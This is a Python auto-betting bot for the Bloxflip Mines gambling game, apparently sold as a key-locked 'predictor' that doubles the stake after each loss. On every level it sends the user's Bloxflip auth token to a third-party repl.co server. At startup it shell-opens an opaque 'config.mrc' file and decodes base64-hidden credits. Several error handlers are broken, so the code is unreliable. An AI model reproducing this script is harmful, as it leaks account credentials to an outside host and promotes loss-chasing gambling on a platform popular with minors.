#!/usr/bin/env python -W ignore::DeprecationWarning 

import cloudscraper, subprocess, threading, selenium, requests, logging, base64, json, time, os
from bloxflip import Authorization, Mines, Currency
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from win10toast import ToastNotifier
from playsound import playsound
from selenium import webdriver
from termcolor import cprint
from zipfile import *
from sys import exit


class Main(Mines):
	def __init__(self):
		logging.basicConfig(filename="errors.txt", level=logging.DEBUG)
		subprocess.call('start "" "assets\config.mrc"', shell=True)
		self.crashPoints = None
		self.multiplier = 0
		self.version = "1.3.3"
		os.system("")
		try:
			self.getConfig()
			self.sendBets()
		except KeyboardInterrupt:
			self.print("Exiting program.")
			self.getConfig()
			self.sendBets()
		except KeyboardInterrupt:
			self.print("Exiting program.")
			os._exit(0)
		except Exception as e:
			open("errors.txt", "w+").close()
			now = time.localtime()
			logging.exception(f'A error has occured at {time.strftime("%H:%M:%S %I", now)}')
			self.print("An error has occured check logs.txt for more info", "error")
			time.sleep(2)
			raise e

	def print(self, message = "", option=None): # print the ui's text with
		print("[ ", end="")

		key = {
			None: ["AUTOBET", "magenta"],
			"error": ["ERROR", "red"],
			"warning": ["WARNING", "yellow"],
			"yellow": ["AUTOBET", "yellow"],
			"good": ["AUTOBET", "green"],
			"bad": ["AUTBET", "bad"]
		}

		title = key[option][0]
		color = key[option][1]

		cprint(title, color, end="")
		print(" ] ", end="")
		cprint(message, color)

	def sendwbmsg(self,url,message,title,color,content):
		if "https://" in url:
			data = {
				"content": content,
				"username": "Smart Bet",
				"embeds": [
									{
										"description" : message,
										"title" : title,
										"color" : color
									}
								]
			}
			r = requests.post(url, json=data)

	def clear(self): # Clear the console
		os.system('cls' if os.name == 'nt' else 'clear')

	def getConfig(self): # Get configuration from config.json file
		uiprint = self.print
		print("[", end="")
		cprint(base64.b64decode(b'IENSRURJVFMg').decode('utf-8'), "cyan", end="")
		print("]", end="")
		print(base64.b64decode(b'IE1hZGUgYnkgSWNlIEJlYXIjMDE2NyAmIEN1dGVjYXQgYnV0IHRlcm1lZCM0NzI4').decode('utf-8'))
		time.sleep(3)
		self.clear()

		try:
			open("config.json", "r").close()
		except:
			uiprint("config.json file is missing. Make sure you downloaded all the files and they're all in the same folder", "error")

		try:
			with open("config.json", "r+") as data:
				config = json.load(data)
		except json.decoder.JSONDecodeError:
			uiprint("Invalid JSON formatting, redownload file from the github")

		try:
			self.levels = int(config["game_levels"])
			self.minesamount = float(config["mines"])
			self.average = int(config["games_averaged"])
			self.auth = config["authorization"]
			self.key = config["key"]
			self.sound = config["play_sounds"]
			self.webhook = config["webhook"]
			self.betamount = float(config["bet_amount"])
			self.maxbet =  float(config["max_betamount"])
			self.bet = float(config["auto_bet"])
			self.stop =  float(config["auto_stop"])
			self.stoploss =  float(config["stop_loss"])
			self.restart = config["auto_restart"]

			if not self.betamount >= 5:
				uiprint("Invalid bet_amount inside JSON file. Must be above 5")
				time.sleep(3)
				os._exit(0)

			if not "https://" in self.webhook:
				uiprint("Invalid webhook inside JSON file file. Make sure you put the https:// with it.", "warning")
				self.webhook = None

			if self.levels < 2:
				uiprint("Levels must be above 2 to make profit.", "error")
				time.sleep(3)
				os._exit(0)

			if self.average > 35:
				uiprint("Too many games_averaged. Must be 35 or less games", "error")
				time.sleep(3)
				os._exit(0)
		except KeyError as e:
			uiprint(f"{k} Key is missing from JSON redownload from github", "error")
			time.sleep(2)
			os._exit(0)

		except ValueError as e:
			key = e.split("'")[1]
			uiprint(f"Invalid {key} inside json")
			time.sleep(2)
			os._exit(0)

			
		self.headers = {
			"x-auth-token": self.auth
		}

		if not Authorization.validate(self.auth):
			uiprint("Invalid Authorization!", "error")
			time.sleep(2)
			os._exit(0)

		super().__init__(self.auth)
		self.mines = super()

		if not type(self.restart) == bool:
			uiprint("Invalid auto_restart boolean inside JSON file. Must be true or false", "error")
			time.sleep(1.6)
			os._exit(0)
		self.hwid = current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

		version = self.version
		data = {"type": "paid"}
		latest_release = requests.get("https://bfpredictor.repl.co/latest_release").text
		if latest_release == version:
			uiprint("Your version is up to date.", "good")
		else:
			uiprint(f"You are currently on v{version}. Please update to the newest version {latest_release}", "error")
			time.sleep(10)
			os._exit(0)

		request = requests.get("https://bfpredictor.repl.co/mines", 
									data={
										"key": self.key,
										"hwid": self.hwid
									}
								)

		if request.status_code == 403:
			uiprint("Invalid key! To buy a valid key create a ticket on the discord. https://discord.gg/HhwNFRaC", "error")
			input("Press enter to exit >> ")
			os._exit(0)


	def playsounds(self, file):
		if self.sound:
			playsound(file)

	def tower_games(self):
		average = self.average
		history = None
		uiprint = self.print
		sent = False
		
		scraper = cloudscraper.create_scraper()
		

		while True:
			games = scraper.get('https://rest-bf.blox.land/games/mines', headers={"x-auth-token":self.auth}).json()
			time.sleep(10)
			if not games["hasGame"]:
				try:
					data = scraper.get('https://rest-bf.blox.land/user/wallet-history?size=10&page=0', headers={"x-auth-token":self.auth}).json()
					amount = data["data"][0]["amount"]
					uuid = data["data"][0]["extraData"]["uuid"]
					if not sent: 
						sent = True
						raise
				except Exception as e:
					amount = 0
					uuid = 0
				yield [amount, uuid]
			time.sleep(0.1)

	def sendBets(self): # Actually compare the user's chances of winning and place the bets
		uiprint = self.print
		uiprint("Betting started. Press Ctrl + C to exit")

		sendwebhookmsg = self.sendwbmsg
		minesamount = self.minesamount
		playsounds = self.playsounds
		betamount = self.betamount
		stoploss = self.stoploss
		average = self.average
		restart = self.restart
		headers = self.headers
		webhook = self.webhook
		levels = self.levels
		maxbet = self.maxbet
		mines = self.mines
		stop = self.stop
		auth = self.auth
		lastgame = None
		bet = self.bet
		key = self.key
		winning = 0
		losing = 0


		scraper = cloudscraper.create_scraper()
		oldbalance = Currency.balance(auth)
		balance = oldbalance
	


		while True:
			uiprint("Game Starting...")
			balance = Currency.balance(auth)

			accuracy = None
			
			amount = -1 * (oldbalance-balance)
			oldbalance = balance


			try:
				if amount > 0:
					if not self.webhook == None:
						sendwebhookmsg(self.webhook, f"You have made {amount} robux", f"You Won!", 0x83d687, f"")
					uiprint(f"Won R${amount} during previous game. lowering bet amount to {self.betamount}", "good")

					betamount = self.betamount

						
					try:
						threading.Thread(target=playsounds, args=('Assets\Win.mp3',)).start()
					except:
						pass
				elif amount < 0:
					uiprint(f"Lost R${abs(amount)} during previous game. Increasing bet amount to {betamount*2}", "bad")
					betamount *= 2
					if not self.webhook == None:
						sendwebhookmsg(self.webhook, f"You lost {betamount} robux\n You have {balance} left", f"You Lost!", 0xcc1c16, f"")

					try:
						threading.Thread(target=playsounds, args=('Assets\Loss.mp3',)).start()
					except:
						pass
				
			except (ValueError, TypeError, UnboundLocalError, NameError):
				uiprint(f"No data for accuracy calculations", "error")


			uiprint(f"Your balance is {balance}")
			if balance < betamount:
				uiprint("You don't have enough robux to continue betting.", "error")
				threading.Thread(target=playsounds, args=('Assets\Loss.mp3',)).start()
				ToastNotifier().show_toast("Bloxflip Smart Bet", 
					   "Oh No! You've run out of robux to bet!", duration = 3,
				 	   icon_path ="assets\\Bloxflip.ico",
				 	   threaded=True
				 	   )
				if not balance < self.betamount and not restart:
					input(f"Press enter to restart betting with {self.betamount} robux")
					betamount = self.betamount
				elif not balance < self.betamount and restart:
					uiprint("Overwritten: Auto Restart is enabled", "warning")
					threading.Thread(target=playsounds, args=('Assets\Win.mp3',)).start()
					ToastNotifier().show_toast("Bloxflip Smart Bet", 
						   "Overwritten: Auto restart is enabled.", duration = 3,
					 	   icon_path ="assets\\Bloxflip.ico",
					 	   threaded=True
					 	   )
					betamount = self.betamount
				else:
					input("Press enter to exit >> ")
					os._exit(0)
			elif balance > stop:
				uiprint("Auto Stop goal reached. Betting has stopped.", "good")
				threading.Thread(target=playsounds, args=('Assets\Win.mp3',)).start()
				ToastNotifier().show_toast("Bloxflip Smart Bet", 
					   "Your auto stop goal has been reached!", duration = 3,
				 	   icon_path ="assets\\Bloxflip.ico",
				 	   threaded=True
				 	   )
				uiprint("If the program is reaching the goal instantly that likely means your balance is already above the auto_stop amount.", "warning")
				uiprint("To fix this simply increase the number to a number higher than your current balance.", "warning")
				input("Press enter to resume betting >> ")
				while True:
					try:
						stop = float(input("Enter new goal: "))
						break
					except:
						uiprint("Invalid number.", "error")
			elif balance < stoploss:
				uiprint(f"Balance is below stop loss. All betting has stopped.", "bad")
				threading.Thread(target=playsounds, args=('Assets\Loss.mp3',)).start()
				ToastNotifier().show_toast("Bloxflip Smart Bet", 
					   "You've hit your stop loss!", duration = 3,
				 	   icon_path ="assets\\Bloxflip.ico",
				 	   threaded=True
				 	   )
				input("Press enter to exit >> ")
				os._exit(0)

			elif balance-betamount < stoploss:
				uiprint(f"Resetting bet amount to {self.betamount}; If game is lost balance will be under stop loss", "yellow")
				threading.Thread(target=playsounds, args=('Assets\Loss.mp3',)).start()
				ToastNotifier().show_toast("Bloxflip Smart Bet", 
					   "You've almost hit your stop loss! Resetting bet amount", duration = 3,
				 	   icon_path ="assets\\Bloxflip.ico",
				 	   threaded=True
				 	   )
				betamount = self.betamount

			if betamount > maxbet:
				uiprint(f"Resetting bet amount to {self.betamount}; Bet amount is above max_betamount:{maxbet}", "yellow")
				threading.Thread(target=playsounds, args=('Assets\Loss.mp3',)).start()
				ToastNotifier().show_toast("Bloxflip Smart Bet", 
					   "You've hit your maxbet! Resetting bet amount", duration = 3,
				 	   icon_path ="assets\\Bloxflip.ico",
				 	   threaded=True
				 	   )
				betamount = self.betamount
 

			balance = Currency.balance(auth)
			try:
				mines.create(betamount, minesamount)
			except Exception as e:
				uiprint(e, "error")

			uiprint(f"Placing bet with {betamount} Robux")
			

			time.sleep(2.5)
			exploded = False
			for level in range(levels):
				while True:
					request = requests.get("https://bfpredictor.repl.co/mines", 
											data={
												"key": key,
												"hwid": self.hwid
											}, headers=headers
										)

					if request.status_code == 403:
						uiprint("Invalid key! To buy a valid key create a ticket on the discord. https://discord.gg/HhwNFRaC", "error")
						input("Press enter to exit >> ")
						os._exit(0)
					elif request.status_code == 500:
						uiprint("Internal server error. Trying again 1.5 seconds...", "error")
						time.sleep(1.5)
					elif request.status_code == 200:
						choice = int(request.text)
						break
					else:
						uiprint("Internal server error. Trying again 1.5 seconds...", "error")
						time.sleep(1.5)
				uiprint(f"Choosing button number {choice+1}")
				try:
					exploded = not mines.choose(choice)
				except Exception as e:
					uiprint(e, "error")
					break

				if exploded:
					break

				uiprint(f"Successfully passed level {level+1}", "good")

			if exploded:
				uiprint("Mine exploded!", "bad")
				continue					
			


			if webhook:
				sendwebhookmsg(self.webhook, f"Betting {betamount} Robux\n{round(balance-betamount,2)} Robux Left", f"Betting {betamount} Robux ", 0x903cde, f"")
			while True:
				try:
					mines.cashout()
					break
				except Exception as e:
					uiprint(e, "red")

			time.sleep(1.5)

if __name__ == "__main__":
	Main()